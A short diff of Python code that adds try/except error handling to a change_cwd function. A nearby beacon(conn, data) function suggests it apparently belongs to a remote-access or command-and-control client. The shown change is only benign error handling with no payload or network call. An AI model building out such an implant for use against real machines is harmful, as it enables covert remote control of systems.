@@ -220,7 +220,12 @@ def get_cwd():
         print_info("PWD: {}".format(CURRENT_WORKING_DIR))
 
 def change_cwd(path):
-    chdir(path)
+    try:
+        chdir(path)
+    except Exception as e:
+        if VERBOSE:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     get_cwd()
 
 def beacon(conn, data):
